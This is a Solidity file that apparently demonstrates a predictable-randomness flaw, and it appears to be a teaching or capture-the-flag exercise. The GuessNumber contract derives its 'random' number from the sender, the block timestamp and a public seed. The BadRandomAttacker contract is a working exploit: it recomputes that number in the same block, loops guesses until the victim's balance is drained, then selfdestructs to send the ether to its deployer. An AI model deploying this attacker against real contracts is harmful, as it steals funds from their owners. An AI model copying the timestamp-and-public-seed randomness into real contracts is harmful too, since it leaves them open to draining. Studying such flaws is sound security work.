//SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

error GuessNumber__balanceIsZero();
error GuessNumber__tooSmallBid();
error GuessNumber__transferFailed();
error GuessNumber__contractMustBeFunded();

contract GuessNumber {
    bytes32 public seed = hex"48656c6c6f2064657465637469766521";
    uint256 public minBid;

    constructor(uint256 _minBid) payable {
        if (msg.value < _minBid) revert GuessNumber__contractMustBeFunded();
        minBid = _minBid;
    }

    function guess(uint256 userNumber) external payable {
        if (msg.value < minBid) revert GuessNumber__tooSmallBid();
        if (address(this).balance == 0) revert GuessNumber__balanceIsZero();

        if (userNumber == getRandomNumber()) {
            (bool isSuccesed, ) = msg.sender.call{value: minBid * 2}("");
            if (!isSuccesed) revert GuessNumber__transferFailed();
        }
    }

    function getRandomNumber() internal view returns (uint256) {
        return
            uint256(keccak256(abi.encode(msg.sender, block.timestamp, seed)));
    }
}

contract BadRandomAttacker {
    constructor(GuessNumber victim) payable {
        uint256 minBid = victim.minBid();
        bytes32 seed = victim.seed();
        uint256 myNumber = uint256(
            keccak256(abi.encode(address(this), block.timestamp, seed))
        );

        while (address(victim).balance >= minBid) {
            victim.guess{value: minBid}(myNumber);
        }

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
